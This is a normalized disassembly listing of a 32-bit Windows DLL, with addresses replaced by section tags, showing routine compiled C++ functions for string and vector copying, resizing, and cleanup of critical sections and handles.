mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp + 0x8 ]
push 0x10
push 0x0
call sub_10001ae0
call sub_10007010
sub esp 0x18
mov esi eax
mov ecx esp
mov [ ebp - 0x44 ] esp
lea eax [ ebp - 0x28 ]
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x2
mov eax [ esi ]
mov [ ebp - 0x4 ] 0x1
mov ecx esi
call [ eax + 0x8 ]
push 0x1
test eax eax
jne r-xdata
sub esp 0x18
lea eax [ ebp + 0x8 ]
mov ecx esp
mov [ ebp - 0x44 ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x3
lea ecx [ ebp - 0x40 ]
mov eax [ esi ]
push ecx
mov [ ebp - 0x4 ] 0x1
mov ecx esi
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax ]
jmp r-xdata
sub esp 0x18
lea eax [ ebp - 0x40 ]
mov ecx esp
mov [ ebp - 0x44 ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x5
mov [ ebp - 0x4 ] 0x4
mov ecx edi
call sub_1002f3f0
mov eax [ esi ]
add esp 0x18
mov ecx esi
push 0x1
call [ eax ]
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x40 ]
call sub_10001880
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x28 ]
call sub_10001880
mov eax [ esi ]
mov ecx esi
push 0x1
call [ eax ]
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x40 ]
call sub_10001880
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
jmp r-xdata
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1002f8a0
push ebp
mov ebp esp
push 0xffffffff
push sub_10051c90
mov eax [ fs : 0x0 ]
push eax
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x4 ] 0x0
test edx edx
je r-xdata
push 0x324
push r--data
lea ecx [ ebp - 0x28 ]
call sub_100019e0
jmp r-xdata
mov ecx edx
lea esi [ ecx + 0x1 ]
lea edx [ ebp - 0x28 ]
lea ecx [ ebp - 0x40 ]
call sub_1003b8a0
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x30 ] 0x0
jbe r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx esi
je r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x2c ] 0x10
jb r-xdata
cmp [ ebp - 0x2c ] 0x10
lea eax [ ebp - 0x40 ]
cmovae eax [ ebp - 0x40 ]
cmp [ eax ] 0x1
jne r-xdata
push edx
lea ecx [ ebp - 0x58 ]
call sub_10001820
mov esi eax
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x28 ]
cmp eax esi
je r-xdata
mov [ ebp - 0x2c ] 0xf
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x40 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
push [ ebp - 0x40 ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x1
push 0x0
lea ecx [ ebp - 0x40 ]
call sub_10001ae0
sub esp 0x18
lea eax [ ebp - 0x40 ]
mov ecx esp
mov [ ebp - 0x60 ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x3
mov [ ebp - 0x4 ] 0x2
mov ecx ebx
call sub_1002f6a0
add esp 0x18
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x44 ] 0x10
jb r-xdata
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0xf
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x44 ] 0xf
mov [ ebp - 0x48 ] 0x0
mov [ ebp - 0x58 ] 0x0
test ecx ecx
je r-xdata
push [ ebp - 0x58 ]
call j_sub_1003f3e3#2
add esp 0x4
push esi
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
call sub_10005010
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
mov edx [ ebp - 0x14 ]
lea eax [ ebp - 0x28 ]
mov esi [ ebp - 0x28 ]
cmp edx 0x10
cmovae eax esi
cmp [ eax ] 0x20
jne r-xdata
test ecx ecx
je r-xdata
cmp ecx 0x1
ja r-xdata
mov ebx [ ebp - 0x5c ]
cmp edx 0x10
lea eax [ ebp - 0x28 ]
cmovae eax esi
cmp [ eax + ecx - 0x1 ] 0x20
jne r-xdata
cmp edx 0x10
lea ebx [ ebp - 0x28 ]
lea edi [ ecx - 0x1 ]
cmovae ebx esi
test edi edi
je r-xdata
cmp edx 0x10
mov [ ebp - 0x18 ] 0x0
lea eax [ ebp - 0x28 ]
cmovae eax esi
mov [ eax ] 0x0
jmp r-xdata
lea edi [ ecx - 0x1 ]
cmp ecx edi
jb r-xdata
cmp edx 0x10
mov [ ebp - 0x18 ] edi
lea eax [ ebp - 0x28 ]
cmovae eax esi
mov [ eax + edi ] 0x0
push edi
lea eax [ ebx + 0x1 ]
push eax
push ebx
call sub_1003c640
mov edx [ ebp - 0x14 ]
add esp 0xc
mov esi [ ebp - 0x28 ]
mov ecx [ ebp - 0x18 ]
test ecx ecx
jne r-xdata
push r--data
call sub_1003c5ec
sub ecx edi
cmp ecx 0x1
jbe r-xdata
cmp edx 0x10
mov [ ebp - 0x18 ] edi
lea eax [ ebp - 0x28 ]
cmovae eax esi
mov [ eax + edi ] 0x0
mov ecx [ ebp - 0x18 ]
test ecx ecx
je r-xdata
cmp edx 0x10
lea ecx [ ebp - 0x28 ]
mov eax edi
cmovae ecx esi
add ecx edi
sub eax edi
je r-xdata
mov edx [ ebp - 0x14 ]
mov esi [ ebp - 0x28 ]
jmp r-xdata
push eax
lea eax [ ecx + 0x1 ]
push eax
push ecx
call sub_1003c640
mov edx [ ebp - 0x14 ]
add esp 0xc
mov esi [ ebp - 0x28 ]
sub_1002fb60
push ebp
mov ebp esp
push 0xffffffff
push sub_10051cc0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
sub eax [ edi ]
sar eax 0x4
push eax
call sub_1002fe00
test al al
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
push ecx
push [ esi ]
mov edx [ edi + 0x4 ]
mov ecx [ edi ]
call sub_10030050
add esp 0xc
mov [ esi + 0x4 ] eax
mov [ ebp - 0x4 ] 0xffffffff
sub_1002fc10
push ebp
mov ebp esp
push 0xffffffff
push sub_10051ce0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov [ ebp - 0x14 ] esi
mov edi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ edi + 0x4 ]
mov ecx [ edi ]
cmp ecx eax
jne r-xdata
mov edx eax
sub edx ecx
sar edx 0x4
mov [ ebp + 0x8 ] edx
mov edx [ esi ]
mov ebx [ esi + 0x4 ]
sub ebx edx
sar ebx 0x4
cmp [ ebp + 0x8 ] ebx
ja r-xdata
mov eax [ esi ]
mov eax [ esi + 0x8 ]
sub eax edx
sar eax 0x4
cmp [ ebp + 0x8 ] eax
ja r-xdata
cmp ecx eax
je r-xdata
test edx edx
je r-xdata
shl ebx 0x4
add ebx ecx
push edx
mov edx ebx
call sub_1002ffc0
add esp 0x4
push [ ebp + 0x8 ]
push ecx
push [ esi + 0x4 ]
mov edx [ edi + 0x4 ]
mov ecx ebx
call sub_100300d0
add esp 0xc
jmp r-xdata
mov eax [ edi + 0x4 ]
sub eax [ edi ]
and eax 0xfffffff0
add eax [ esi ]
jmp r-xdata
jmp r-xdata
mov eax [ edi + 0x4 ]
sub eax [ edi ]
sar eax 0x4
push eax
mov ecx esi
call sub_1002fe00
test al al
je r-xdata
push edx
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi + 0x4 ] eax
movdqu xmm0 [ ecx ]
movdqu [ edx ] xmm0
lea edx [ edx + 0x10 ]
add ecx 0x10
cmp ecx eax
jne r-xdata
mov [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
push ecx
push [ esi ]
mov edx [ edi + 0x4 ]
mov ecx [ edi ]
call sub_100300d0
add esp 0xc
mov [ esi + 0x4 ] eax
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
sub_1002fd50
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b881
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ esi + 0x4 ]
mov edi [ ebp + 0x8 ]
cmp edi eax
jae r-xdata
cmp eax [ esi + 0x8 ]
jne r-xdata
mov ecx [ esi ]
cmp ecx edi
ja r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push ecx
mov ecx esi
call sub_1002fe70
sub edi ecx
cmp eax [ esi + 0x8 ]
jne r-xdata
add [ esi + 0x4 ] 0x10
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
movdqu xmm0 [ edi ]
movdqu [ eax ] xmm0
mov eax [ esi + 0x4 ]
and edi 0xfffffff0
add edi [ esi ]
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
push ecx
mov ecx esi
call sub_1002fe70
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
movdqu xmm0 [ edi ]
movdqu [ eax ] xmm0
sub_1002fe00
push ebp
mov ebp esp
push esi
mov esi ecx
push edi
mov edi [ ebp + 0x8 ]
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
test edi edi
jne r-xdata
cmp edi 0xfffffff
ja r-xdata
pop edi
xor al al
pop esi
pop ebp
retn 0x4
push r--data
call sub_1003c5be
shl edi 0x4
push edi
call sub_1003cdeb
add esp 0x4
test eax eax
je r-xdata
call sub_1003c58d
mov [ esi ] eax
mov [ esi + 0x4 ] eax
add eax edi
mov [ esi + 0x8 ] eax
mov al 0x1
pop edi
pop esi
pop ebp
retn 0x4
sub_1002fe70
mov edx [ ecx + 0x8 ]
mov eax edx
push esi
mov esi [ ecx + 0x4 ]
sub eax esi
sar eax 0x4
cmp eax 0x1
jae r-xdata
pop esi
retn 0x4
sub esi [ ecx ]
push edi
mov edi 0xfffffff
sar esi 0x4
mov eax edi
sub eax esi
cmp eax 0x1
jb r-xdata
push r--data
call sub_1003c5be
sub edx [ ecx ]
inc esi
sar edx 0x4
mov eax edx
shr eax 0x1
sub edi eax
cmp edi edx
pop edi
jae r-xdata
add edx eax
cmp edx esi
cmovb edx esi
push edx
call sub_1002fee0
xor edx edx
cmp edx esi
cmovb edx esi
push edx
call sub_1002fee0
pop esi
retn 0x4
sub_1002fee0
push ebp
mov ebp esp
push 0xffffffff
push sub_10051d00
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
mov [ ebp - 0x18 ] ebx
xor edi edi
mov [ ebp - 0x14 ] edi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
mov [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
sub esp 0x8
push edi
mov edx [ ebx + 0x4 ]
mov ecx [ ebx ]
call sub_10030150
add esp 0x10
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebx ]
mov ebx [ ebx + 0x4 ]
sub ebx eax
test eax eax
je r-xdata
cmp esi 0xfffffff
ja r-xdata
shl esi 0x4
add esi edi
mov eax [ ebp - 0x18 ]
mov [ eax + 0x8 ] esi
and ebx 0xfffffff0
add ebx edi
mov [ eax + 0x4 ] ebx
mov [ eax ] edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push eax
call j_sub_1003f3e3#2
add esp 0x4
call sub_1003c58d
mov eax esi
shl eax 0x4
push eax
call sub_1003cdeb
add esp 0x4
mov edi eax
mov [ ebp - 0x14 ] edi
test edi edi
jne r-xdata
sub_1002ffc0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp ecx edx
je r-xdata
pop ebp
retn
lea ebx [ ebx ]
movdqu xmm0 [ ecx ]
add ecx 0x10
movdqu [ eax ] xmm0
add eax 0x10
cmp ecx edx
jne r-xdata
sub_1002fff0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b941
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
movdqu xmm0 [ eax ]
movdqu [ ecx ] xmm0
sub_10030050
push ebp
mov ebp esp
push 0xffffffff
push sub_10051d20
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test eax eax
je r-xdata
add eax 0x10
mov [ ebp + 0x8 ] eax
add ecx 0x10
mov [ ebp - 0x14 ] ecx
jmp r-xdata
movdqu xmm0 [ ecx ]
movdqu [ eax ] xmm0
cmp ecx edx
je r-xdata
sub_100300d0
push ebp
mov ebp esp
push 0xffffffff
push sub_10051d40
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi edx
mov edi ecx
mov [ ebp - 0x4 ] 0x0
mov ebx [ ebp + 0x8 ]
lea esp [ esp ]
mov [ ebp - 0x4 ] 0xffffffff
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edi
push ebx
call sub_1002fff0
add ebx 0x10
mov [ ebp + 0x8 ] ebx
add edi 0x10
mov [ ebp - 0x14 ] edi
jmp r-xdata
cmp edi esi
je r-xdata
sub_10030150
push ebp
mov ebp esp
push 0xffffffff
push sub_10051d71
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x0
add eax 0x10
mov [ ebp + 0x8 ] eax
add ecx 0x10
mov [ ebp - 0x18 ] ecx
jmp r-xdata
movdqu xmm0 [ ecx ]
movdqu [ eax ] xmm0
cmp ecx edx
je r-xdata
sub_100301f0
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_10030220
push ebp
mov ebp esp
push 0xffffffff
push sub_10051dac
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edx ecx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] 0x0
mov [ edx + 0x4 ] r--data
mov [ edx + 0x10 ] r--data
mov [ ebp - 0x4 ] 0x0
mov eax [ edx + 0x4 ]
mov [ edx ] r--data
mov [ ebp - 0x10 ] 0x1
mov eax [ eax + 0x4 ]
mov [ eax + edx + 0x4 ] r--data
mov eax [ edx + 0x4 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + edx ] eax
mov [ edx + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov eax edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
sub_100302b0
push ebp
mov ebp esp
mov eax [ ecx - 0xc ]
push esi
lea esi [ ecx - 0x10 ]
mov [ esi ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x4 ] r--data
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + esi ] eax
mov ecx [ esi + 0x8 ]
test ecx ecx
je r-xdata
test [ ebp + 0x8 ] 0x1
mov [ esi + 0x10 ] r--data
je r-xdata
mov eax [ ecx ]
call [ eax + 0x4 ]
mov ecx [ esi + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x10 ]
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_10030310
push ebp
mov ebp esp
push 0xffffffff
push sub_100510fb
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
cmp [ esi + 0x8 ] 0x0
je r-xdata
push 0x48
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov eax 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor ebx ebx
mov ecx eax
call sub_10030610
mov ebx eax
jmp r-xdata
test edi edi
je r-xdata
mov [ ebx + 0x40 ] edi
mov ecx [ esi + 0x8 ]
mov eax [ ecx ]
call [ eax ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebx + 0x14 ]
mov [ esi + 0x8 ] ebx
mov eax [ ecx ]
call [ eax + 0x4 ]
mov edi [ ebp + 0x8 ]
test eax eax
je r-xdata
mov [ esi + 0x8 ] 0x0
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ edi ]
mov ecx edi
push 0x1
call [ eax ]
sub_10030410
push ebp
mov ebp esp
push 0xffffffff
push sub_10050ea8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ecx - 0x8 ]
lea esi [ edi + 0x14 ]
mov [ ebp - 0x10 ] esi
mov ecx esi
mov eax [ esi ]
call [ eax + 0x8 ]
mov [ ebp - 0x4 ] 0x0
inc [ edi + 0x44 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0x0
jne r-xdata
mov ax [ edi + 0x44 ]
lea ecx [ edi + 0x34 ]
mov [ ebp - 0x14 ] ax
lea eax [ ebp - 0x1c ]
push eax
call sub_10003710
mov [ ebp - 0x4 ] 0xffffffff
mov ecx esi
mov eax [ esi ]
call [ eax + 0xc ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov eax 0x1
mov [ edi + 0x44 ] ax
sub_100304a0
push ebp
mov ebp esp
push 0xffffffff
push sub_10050f08
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ecx - 0x8 ]
lea esi [ edi + 0x14 ]
mov [ ebp - 0x10 ] esi
mov ecx esi
mov eax [ esi ]
call [ eax + 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov eax 0x2aaaaaab
mov ecx [ edi + 0x38 ]
sub ecx [ edi + 0x34 ]
imul ecx
sar edx 0x1
mov edi edx
shr edi 0x1f
add edi edx
mov [ ebp - 0x4 ] 0xffffffff
mov edx [ esi ]
mov ecx esi
call [ edx + 0xc ]
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_10030540
push ebp
mov ebp esp
mov ecx [ ecx - 0x8 ]
lea eax [ ebp - 0xc ]
sub esp 0xc
push [ ebp + 0x8 ]
push eax
call sub_100307f0
xor ecx ecx
cmp [ eax + 0x4 ] ecx
setne cl
mov eax ecx
mov esp ebp
pop ebp
retn 0x4
sub_10030610
push ebp
mov ebp esp
push 0xffffffff
push sub_10051dfe
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
mov [ ebp - 0x4 ] 0x0
mov [ ecx ] r--data
mov [ ecx + 0x10 ] 0x0
mov [ ecx + 0x4 ] 0x0
mov [ ecx + 0x8 ] 0x0
mov [ ecx + 0xc ] 0x0
mov [ ebp - 0x4 ] 0x1
lea eax [ ecx + 0x14 ]
mov [ ecx ] r--data
mov [ ebp - 0x14 ] eax
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x2
xorps xmm0 xmm0
mov [ eax ] r--data
mov [ eax + 0x4 ] 0x0
movdqu [ eax + 0x8 ] xmm0
movq [ eax + 0x18 ] xmm0
mov [ ebp - 0x4 ] 0x3
mov [ ecx + 0x34 ] 0x0
mov [ ecx + 0x38 ] 0x0
mov [ ecx + 0x3c ] 0x0
mov [ ebp - 0x4 ] 0x4
xor eax eax
mov [ ecx + 0x44 ] ax
mov [ ecx + 0x40 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax ecx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_100306e0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10030710
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_10030710
push ebp
mov ebp esp
push 0xffffffff
push sub_10051e4e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x1
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x0
lea edi [ esi + 0x14 ]
mov [ ebp - 0x14 ] edi
mov [ edi ] r--data
mov [ ebp - 0x4 ] 0x3
cmp [ edi + 0x4 ] 0x0
je r-xdata
push eax
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi + 0x34 ] 0x0
mov [ esi + 0x38 ] 0x0
mov [ esi + 0x3c ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ edi ] r--data
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x4
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
lea eax [ edi + 0x8 ]
push eax
call [ DeleteCriticalSection@IAT ]
mov [ edi + 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
push eax
call [ CloseHandle@IAT ]
mov [ esi + 0x10 ] 0x0
sub_100307f0
push ebp
mov ebp esp
push 0xffffffff
push sub_10050b98
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
lea esi [ edi + 0x14 ]
mov [ ebp - 0x10 ] esi
mov ecx esi
mov eax [ esi ]
call [ eax + 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov eax 0x2aaaaaab
mov ecx [ edi + 0x38 ]
mov ebx [ edi + 0x34 ]
sub ecx ebx
imul ecx
mov ecx [ ebp + 0xc ]
sar edx 0x1
mov eax edx
shr eax 0x1f
add eax edx
cmp eax ecx
ja r-xdata
mov edi [ ebp + 0x8 ]
lea eax [ ecx + ecx * 2 ]
movq xmm0 [ ebx + eax * 4 ]
mov ecx [ ebx + eax * 4 + 0x8 ]
movq [ edi ] xmm0
mov [ edi + 0x8 ] ecx
mov [ ebp - 0x4 ] 0xffffffff
mov ecx esi
mov edx [ esi ]
call [ edx + 0xc ]
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push r--data
call sub_1003c5ec
sub_10030890
push ebp
mov ebp esp
push 0xffffffff
push sub_10050b98
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
lea edi [ ebx + 0x14 ]
mov [ ebp - 0x10 ] edi
mov ecx edi
mov eax [ edi ]
call [ eax + 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov eax 0x2aaaaaab
mov ecx [ ebx + 0x38 ]
sub ecx [ ebx + 0x34 ]
imul ecx
mov ecx [ ebp + 0x8 ]
sar edx 0x1
mov eax edx
shr eax 0x1f
add eax edx
cmp eax ecx
jbe r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx edi
mov eax [ edi ]
call [ eax + 0xc ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov esi [ ebx + 0x34 ]
test ecx ecx
je r-xdata
mov ecx [ esi ]
test ecx ecx
je r-xdata
lea eax [ ecx + ecx * 2 ]
lea esi [ esi + eax * 4 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
